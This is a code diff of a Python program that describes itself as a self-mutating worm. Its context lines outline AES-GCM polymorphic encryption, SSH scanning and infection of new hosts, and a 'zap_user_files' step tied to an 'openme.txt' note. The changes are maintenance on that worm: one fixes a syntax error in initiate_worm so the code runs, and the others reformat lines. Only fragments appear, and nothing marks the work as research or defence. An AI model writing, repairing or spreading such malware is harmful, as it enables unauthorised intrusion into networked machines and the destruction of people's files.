@@ -4,8 +4,7 @@ This worm does the following:
   - If the file is mutated (i.e. contains the AES‑GCM decryption wrapper),
     it decrypts and executes its worm body.
   - Otherwise, it scans for new target hosts (via SSH), infects them,
-    and then self‑mutates so that a new unique copy is used for the next 
-    propagation cycle.
+    and then self‑mutates so that a new unique copy is used for the next propagation cycle.
 """
 
 import sys, os, base64, uuid, socket, time, re, subprocess, threading, traceback, logging
@@ -48,7 +47,6 @@ if "# === ENCRYPTED BODY START ===" in head:
 #################################
 # Worm Body (Propagation Routine)
 #################################
-
 # Worm configuration constants
 HOME_DIR = os.path.expanduser("~")
 REMOTE_DIR = "Temp"
@@ -94,7 +92,6 @@ logger.addHandler(file_handler)
 ########################################
 # Polymorphic Engine (AES-GCM Functions)
 ########################################
-
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
@@ -249,11 +246,10 @@ def get_remote_exec_command(ssh, mutated_file, remote_os):
 ###########################################
 # Worm Core (Network Propagation Functions)
 ###########################################
-
 def initiate_worm():
     """Perform scanning, infection, and mutation propagation."""
     # If infection note doesn't exist, perform zap operation.
-    if not os.path.isfile(os.path.join(HOME_DIR, "openme.txt"):
+    if not os.path.isfile(os.path.join(HOME_DIR, "openme.txt")):
         zap_user_files()
     #Remove the debug log file if present -- uncomment if you want to examine each host's logs
     #if os.path.isfile("/tmp/dmsg.log"):
@@ -671,7 +667,6 @@ def exec_remote_command(ssh, command):
 #########################################
 # End Worm Core Functions
 #########################################
-
 if __name__ == "__main__":
     try:
         initiate_worm()
